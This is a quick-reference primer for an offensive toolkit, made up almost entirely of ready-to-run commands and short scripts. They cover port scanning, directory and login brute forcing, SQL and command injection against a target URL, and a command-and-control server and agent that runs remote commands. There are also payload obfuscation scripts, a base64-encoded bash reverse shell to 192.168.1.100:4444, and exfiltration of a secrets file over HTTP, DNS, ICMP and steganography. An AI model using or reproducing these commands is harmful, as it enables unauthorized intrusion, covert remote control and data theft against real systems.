# Primer 2: Essential Commands & Quick Wins

## 15-Minute Power User Guide

This primer provides essential commands and quick wins to help you become productive with the toolkit immediately. Each command is battle-tested and ready to use.

---

## Table of Contents

1. [Essential Recon Commands](#essential-recon-commands)
2. [Essential Web Commands](#essential-web-commands)
3. [Essential Exploit Commands](#essential-exploit-commands)
4. [Essential C2 Commands](#essential-c2-commands)
5. [Essential Payload Commands](#essential-payload-commands)
6. [One-Liner Power Commands](#one-liner-power-commands)
7. [Quick Win Scripts](#quick-win-scripts)

---

## Essential Recon Commands

### Port Scanning

```bash
# Quick port scan on a target
cd ~/hacking-toolkit/recon
python3 port_scanner.py 192.168.1.1 -p 22,80,443,3306,3389,5900,8080

# Scan all common ports
python3 port_scanner.py 192.168.1.1 -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443

# Full port scan (use with caution)
python3 port_scanner.py 192.168.1.1 -p 1-65535 -t 200 -T 1.0

# Scan with banner grabbing
python3 port_scanner.py 192.168.1.1 -p 22,80,443 -t 50 --banners

# Save results to file
python3 port_scanner.py 192.168.1.1 -p 22,80,443 -o scan_results.json

# Quick preset scans
python3 quick_scan.py 192.168.1.1 web
python3 quick_scan.py 192.168.1.1 common
python3 quick_scan.py 192.168.1.1 all 200
```

### Packet Sniffing

```bash
# Sniff HTTP traffic (requires root)
sudo python3 packet_crafter.py

# Or use directly:
sudo python3 -c "
from scapy.all import sniff
print('[*] Sniffing HTTP traffic...')
packets = sniff(filter='tcp port 80', count=10)
for pkt in packets:
    if pkt.haslayer('TCP'):
        print(f'HTTP packet: {pkt.summary()}')
"

# Sniff and save
sudo python3 -c "
from scapy.all import sniff, wrpcap
packets = sniff(count=50, timeout=30)
wrpcap('capture.pcap', packets)
print('[+] Captured 50 packets to capture.pcap')
"
```

### Network Analysis

```bash
# Perform traceroute
python3 packet_crafter.py

# Or directly:
python3 -c "
from packet_crafter import AdvancedPacketTools
crafter = AdvancedPacketTools(verbose=False)
crafter.traceroute('google.com')
"

# DNS resolution test
python3 -c "
import socket
for host in ['google.com', 'github.com', 'example.com']:
    try:
        ip = socket.gethostbyname(host)
        print(f'{host} -> {ip}')
    except:
        print(f'{host} -> [ERROR]')
"
```

---

## Essential Web Commands

### Directory Brute Force

```bash
cd ~/hacking-toolkit/web-attack

# Quick scan with common wordlist
python3 brute_forcer.py https://example.com -w common -t 30

# Scan with extensions
python3 brute_forcer.py https://example.com -w common -e .php,.html,.txt -t 50

# Recursive scan
python3 brute_forcer.py https://example.com -w common -r -d 2

# Custom wordlist
python3 brute_forcer.py https://example.com -w custom_wordlist.txt -t 100

# Admin panel discovery
python3 brute_forcer.py https://example.com -w admin -t 20

# Show only 200 and 403 statuses
python3 brute_forcer.py https://example.com -w common --min-status 200 --max-status 403
```

### HTML Analysis

```bash
# Quick HTML analysis
python3 -c "
from html_analyzer import HTMLAnalyzer
analyzer = HTMLAnalyzer()
analysis = analyzer.analyze_url('https://example.com')
print(f'Title: {analysis.title}')
print(f'Forms: {len(analysis.forms)}')
print(f'Links: {len(analysis.links)}')
print(f'Comments: {len(analysis.comments)}')
print(f'Emails: {analysis.emails}')
"

# Full website scan
python3 -c "
from html_analyzer import WebContentScanner
scanner = WebContentScanner('https://example.com')
results = scanner.scan_site(max_pages=20)
report = scanner.generate_report()
print(f'Pages scanned: {len(results)}')
print(f'Total forms: {report[\"total_forms\"]}')
print(f'Emails found: {report[\"emails_found\"]}')
"

# Check for sensitive data
python3 -c "
from html_analyzer import HTMLAnalyzer
analyzer = HTMLAnalyzer()
analysis = analyzer.analyze_url('https://example.com')
if analysis.potential_sensitive:
    print('[!] Potential sensitive data found!')
    for item in analysis.potential_sensitive:
        print(f'  {item[\"type\"]}: {item[\"match\"][:50]}')
"
```

### Authentication Testing

```bash
# Test login form
python3 -c "
from auth_automation import AuthAutomation
auth = AuthAutomation()
session = auth.login_basic(
    'https://example.com/login',
    'admin',
    'password123'
)
if session:
    print('[+] Login successful!')
else:
    print('[-] Login failed')
"

# Brute force login
python3 -c "
from auth_automation import LoginBruteforcer
bruteforcer = LoginBruteforcer()
results = bruteforcer.intelligent_bruteforce(
    'https://example.com/login',
    'username',
    'password',
    base_username='admin'
)
print(f'Found: {results}')
"
```

### Wordlist Generation

```bash
# Generate custom wordlist
python3 wordlist_generator.py

# Generate technology-specific wordlist
python3 -c "
from wordlist_generator import WordlistGenerator
gen = WordlistGenerator()
words = gen.generate_technology_specific('wordpress')
print(f'Generated {len(words)} WordPress paths')
for w in words[:10]:
    print(f'  {w}')
"
```

---

## Essential Exploit Commands

### SQL Injection Testing

```bash
cd ~/hacking-toolkit/exploit

# Test SQL injection on parameter
python3 exploit_framework.py "http://target.com/page.php?id=1" --sql-injection --parameter id --verbose

# Quick SQL injection test
python3 -c "
from exploit_framework import SQLInjectionExploit
exploit = SQLInjectionExploit('http://target.com/page.php?id=1', 'id')
result = exploit.exploit()
if result.success:
    print('[+] SQL Injection found!')
    print(f'Payload: {result.payload}')
"
```

### Command Injection Testing

```bash
# Test command injection
python3 exploit_framework.py "http://target.com/page.php?cmd=ls" --cmd-injection --parameter cmd --verbose

# Quick command injection
python3 -c "
from exploit_framework import CommandInjectionExploit
exploit = CommandInjectionExploit('http://target.com/page.php?cmd=ls', 'cmd')
result = exploit.exploit()
if result.success:
    print('[+] Command Injection found!')
    print(f'Output: {result.output}')
"
```

### API Reconnaissance

```bash
# Enumerate API endpoints
python3 api_client.py https://api.example.com --intel

# Test GraphQL
python3 api_client.py https://graphql.example.com -g "query { __schema { queryType { name } } }"

# API brute force
python3 -c "
from api_client import APIClient
client = APIClient('https://api.example.com')
endpoints = client.brute_force_endpoints('/api', ['users', 'admin', 'login'])
print(f'Found endpoints: {endpoints}')
"
```

### Exploit All

```bash
# Run all exploits against a target
python3 exploit_framework.py "http://target.com/page.php?id=1" --all --parameter id --verbose

# Save report
python3 exploit_framework.py "http://target.com/page.php?id=1" --all --parameter id > exploit_report.txt
```

---

## Essential C2 Commands

### Quick C2 Setup

```bash
cd ~/hacking-toolkit/post-exploit

# Terminal 1: Start server
python3 c2_server.py

# Terminal 2: Start agent
python3 c2_agent.py

# Terminal 3: Add tasks via curl
curl -X POST http://localhost:8443/c2/task \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"your_agent_id","command":"whoami"}'
```

### C2 Management Commands

```bash
# List agents
curl http://localhost:8443/c2/agents | python3 -m json.tool

# Get agent info
curl http://localhost:8443/c2/agent/YOUR_AGENT_ID | python3 -m json.tool

# Get results
curl http://localhost:8443/c2/results/YOUR_AGENT_ID | python3 -m json.tool

# Add multiple tasks
for cmd in whoami hostname "ls -la"; do
    curl -X POST http://localhost:8443/c2/task \
      -H "Content-Type: application/json" \
      -d "{\"agent_id\":\"YOUR_AGENT_ID\",\"command\":\"$cmd\"}"
done
```

### C2 Agent Commands

```bash
# Start agent with custom settings
python3 c2_agent.py

# Agent built-in commands (from C2 server):
# whoami - Get current user
# hostname - Get hostname
# platform - Get OS
# ip - Get IP
# info - Full agent info
# ls - List directory
# who - Logged in users
# system [cmd] - Execute command
# download [file] - Download file
# sleep [seconds] - Sleep
# beacon [seconds] - Set beacon interval
# exit - Stop agent
```

---

## Essential Payload Commands

### Obfuscation

```bash
cd ~/hacking-toolkit/exploit

# Encode a payload
python3 obfuscator.py -p "whoami" -t base64,hex,url

# Generate random obfuscation
python3 obfuscator.py -p "whoami" --random

# Generate reverse shells
python3 obfuscator.py --reverse-shell -i 192.168.1.100 -p 4444

# Generate SQL payloads
python3 obfuscator.py --sql -o sql_payloads.txt

# Generate all payload types
python3 obfuscator.py --all -o all_payloads.json
```

### Quick Payload Generation

```bash
# Generate base64 encoded reverse shell
python3 -c "
import base64
shell = 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
encoded = base64.b64encode(shell.encode()).decode()
print(f'Original: {shell}')
print(f'Base64: {encoded}')
"

# Generate XOR encoded payload
python3 -c "
from obfuscator import ObfuscationEngine
obf = ObfuscationEngine()
payload = 'whoami'
encoded = obf.encode_xor(payload, 'secret')
print(f'Original: {payload}')
print(f'XOR encoded: {encoded}')
"

# Generate multi-encoded payload
python3 -c "
from obfuscator import ObfuscationEngine
obf = ObfuscationEngine()
payload = 'whoami'
encoded = obf.multi_encode(payload, ['base64', 'hex', 'url'])
print(f'Original: {payload}')
print(f'Multi-encoded: {encoded}')
"
```

### Exfiltration

```bash
# HTTP exfiltration
python3 exfiltration.py --http -u http://example.com/exfil -f secret.txt

# DNS exfiltration
python3 exfiltration.py --dns -d example.com -f secret.txt

# ICMP exfiltration (requires root)
sudo python3 exfiltration.py --icmp -t 8.8.8.8 -f secret.txt

# Steganography
python3 exfiltration.py --steganography -i cover.png -f secret.txt

# Multi-channel exfiltration
python3 exfiltration.py --all -f secret.txt
```

---

## One-Liner Power Commands

### Recon One-Liners

```bash
# Quick port scan with nmap comparison
nmap -p- --open -T4 192.168.1.1
python3 port_scanner.py 192.168.1.1 -p 1-1000 -t 100

# Find all HTTP servers in a network
for ip in $(seq 1 254); do
    python3 port_scanner.py 192.168.1.$ip -p 80 -T 1 & done

# Extract all URLs from a website
python3 -c "
from html_analyzer import HTMLAnalyzer
analyzer = HTMLAnalyzer()
analysis = analyzer.analyze_url('https://example.com')
for link in analysis.links[:10]:
    print(link['absolute_url'])
"

# Find emails in a website
python3 -c "
from html_analyzer import HTMLAnalyzer
analyzer = HTMLAnalyzer()
analysis = analyzer.analyze_url('https://example.com')
for email in analysis.emails:
    print(email)
"
```

### Exploit One-Liners

```bash
# Quick SQL injection test
python3 -c "
from exploit_framework import SQLInjectionExploit
exploit = SQLInjectionExploit('http://target.com/page.php?id=1', 'id')
print('Vulnerable' if exploit.exploit().success else 'Not vulnerable')
"

# Quick command injection test
python3 -c "
from exploit_framework import CommandInjectionExploit
exploit = CommandInjectionExploit('http://target.com/page.php?cmd=ls', 'cmd')
print('Vulnerable' if exploit.exploit().success else 'Not vulnerable')
"

# Test all parameters for SQL injection
for param in id user page; do
    python3 -c "
from exploit_framework import SQLInjectionExploit
exploit = SQLInjectionExploit('http://target.com/page.php?$param=1', '$param')
print('[$param]', 'Vulnerable' if exploit.exploit().success else 'Safe')
"
done
```

### Obfuscation One-Liners

```bash
# Quick base64 encode
echo "whoami" | base64

# Quick XOR encode
python3 -c "
data = 'whoami'
key = 'secret'
result = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(data, key*len(data)))
print(result.encode().hex())
"

# Quick reverse shell generation
python3 -c "
import base64
shell = 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
print(base64.b64encode(shell.encode()).decode())
"
```

### System Enumeration One-Liners

```bash
# Quick system info
python3 -c "
from post_exploit.enumerator import SystemEnumerator
enumerator = SystemEnumerator(verbose=False)
info = enumerator.get_system_info()
print(f'{info.hostname} - {info.os_name} {info.os_version} ({info.cpu_count} CPUs)')
"

# Quick user list
python3 -c "
from post_exploit.enumerator import SystemEnumerator
enumerator = SystemEnumerator(verbose=False)
users = enumerator.get_users()
for user in users[:5]:
    print(f'{user.username}: {user.uid}')
"

# Quick process list
python3 -c "
from post_exploit.enumerator import SystemEnumerator
enumerator = SystemEnumerator(verbose=False)
processes = enumerator.get_processes()
for proc in processes[:5]:
    print(f'{proc.pid}: {proc.name} ({proc.username})')
"
```

---

## Quick Win Scripts

### Script 1: Quick Target Scan

```python
# Save as quick_target_scan.py
#!/usr/bin/env python3
import sys
from port_scanner import PortScanner

def quick_scan(target):
    """Quick scan of common ports"""
    ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443]
    scanner = PortScanner(target, ports, max_threads=50, timeout=2.0)
    results = scanner.scan()
    scanner.print_results()
    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 quick_target_scan.py <target>")
        sys.exit(1)
    quick_scan(sys.argv[1])
```

**Usage:**
```bash
python3 quick_target_scan.py 192.168.1.1
```

### Script 2: Web Form Analyzer

```python
# Save as web_form_analyzer.py
#!/usr/bin/env python3
import sys
from html_analyzer import HTMLAnalyzer

def analyze_forms(url):
    """Analyze forms on a website"""
    analyzer = HTMLAnalyzer()
    analysis = analyzer.analyze_url(url)
    
    print(f"\n[+] Forms found: {len(analysis.forms)}")
    for i, form in enumerate(analysis.forms, 1):
        print(f"\nForm {i}:")
        print(f"  Action: {form['action']}")
        print(f"  Method: {form['method']}")
        print(f"  Has password: {form['has_password']}")
        print(f"  Inputs:")
        for inp in form['inputs']:
            print(f"    - {inp['name']} ({inp['type']})")
            if inp.get('options'):
                print(f"      Options: {[opt['value'] for opt in inp['options']]}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 web_form_analyzer.py <url>")
        sys.exit(1)
    analyze_forms(sys.argv[1])
```

**Usage:**
```bash
python3 web_form_analyzer.py https://example.com
```

### Script 3: Payload Generator

```python
# Save as payload_generator.py
#!/usr/bin/env python3
import sys
import base64
from obfuscator import ObfuscationEngine

def generate_payloads(payload):
    """Generate various obfuscated versions of a payload"""
    obf = ObfuscationEngine()
    
    print(f"\n[*] Original: {payload}\n")
    print("Encoded variants:")
    print(f"  Base64: {obf.encode_base64(payload)}")
    print(f"  Hex:    {obf.encode_hex(payload)}")
    print(f"  ROT13:  {obf.encode_rot13(payload)}")
    print(f"  URL:    {obf.encode_url(payload)}")
    print(f"  XOR:    {obf.encode_xor(payload, 'secret')}")
    print(f"  Reverse: {obf.encode_reverse(payload)}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        payload = input("Enter payload to obfuscate: ")
    else:
        payload = sys.argv[1]
    generate_payloads(payload)
```

**Usage:**
```bash
python3 payload_generator.py "whoami"
```

### Script 4: Service Banner Grabber

```python
# Save as banner_grabber.py
#!/usr/bin/env python3
import sys
import socket

def grab_banner(host, port):
    """Grab service banner from a port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
        
        # Send appropriate probe
        if port == 80 or port == 443 or port == 8080:
            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
        elif port == 21:
            sock.send(b'USER anonymous\r\n')
        elif port == 25:
            sock.send(b'HELO localhost\r\n')
        
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        return banner
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 banner_grabber.py <host> <port>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    banner = grab_banner(host, port)
    print(f"\n[*] Banner from {host}:{port}:")
    print(banner[:500])
```

**Usage:**
```bash
python3 banner_grabber.py 192.168.1.1 80
```

---

## Primer 2 Complete

You now have a powerful set of commands and scripts at your disposal. These essentials will help you quickly perform common security tasks and get results fast.

**Pro Tips:**
1. **Save frequently used commands** as aliases in your ~/.bashrc
2. **Create custom scripts** for your common workflows
3. **Experiment with parameters** to discover new capabilities
4. **Combine commands** for powerful automation
